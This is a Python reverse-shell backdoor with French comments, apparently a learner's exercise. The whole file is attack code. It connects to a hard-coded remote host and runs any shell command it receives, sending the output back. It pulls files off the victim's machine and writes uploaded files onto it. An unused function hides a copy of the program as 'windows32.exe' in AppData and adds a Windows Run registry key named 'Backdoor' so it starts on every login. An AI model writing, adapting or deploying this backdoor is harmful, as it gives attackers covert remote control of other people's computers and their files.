#!/usr/bin/python3

import socket
import subprocess
import json
import os
import sys

def reliable_send(data):
    print("data {}, type {}, compare {}".format(data, type(data), type(data) is not bytes))
    if type(data) is not bytes:
        json_data = json.dumps(data)
    else:
        json_data = json.dumps(data.decode('utf-8'))
    json_data = json_data.encode()
    print("json_data -> {} ".format(json_data))
    sock.send(json_data)


def reliable_recv():
    data = ""
    while True:
        try:
            data_recv = sock.recv(1024).decode('utf-8')
            data = data + data_recv
            return json.loads(data)
        except ValueError:
            continue

def shell():
    while True:
        command = reliable_recv()
        print("command -> {}".format(command))
        if command == 'q':
            sock.close()
            break
        # on teste si la commande c'est cd donc qu'on change de directory
        # si je fais pas ça le programme plante quand on change de directory
        elif len(command) > 1 and command[:2] == "cd":
            print("je rentre dans le cd")
            try:
                # on met que un espace apres le cd
                os.chdir(command[3:])
            except:
                continue
        elif len(command) > 1 and command[:8] == "download":
            print("je rentre bien dans download")
            #try:
            with open(command[9:], "rb") as file:
                reliable_send(file.read())
            #except:
            #    reliable_send("Failed to Download")
        elif len(command) > 1 and command[:6] == "upload":
            print("je suis dans upload")
            file_data = command.split(" | ")
            file_name = command[7:len(file_data[0])]
            with open(command[7:len(file_data[0])], "wb") as file:
                print("file_data -> {}".format(file_data[1]))
                print("file_name -> {}".format(file_name))
                file.write(file_data[1].encode())
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            reliable_send(result.decode('utf-8'))

def createBackdoorOnWindowsMachine():
    # on cree le path du fichier pour qu'il soit cacher
    location = os.environ["appdata"] + "\\windows32.exe"
    if not os.path.exists(location):
        #on copie le fichier dans un le dossier location pourqu'il soit imreperable, meme si l'autre est supprimer celui-ci restera
        shutil.copyfile(sys.executable, location)
        # on appelle une commande de l'invite de command windows
        # cette commande permet d'ajouter au registry de demarrage windows pour les logiciels 32 bits
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.0.45", 54321))

if __name__ == '__main__':
    shell()

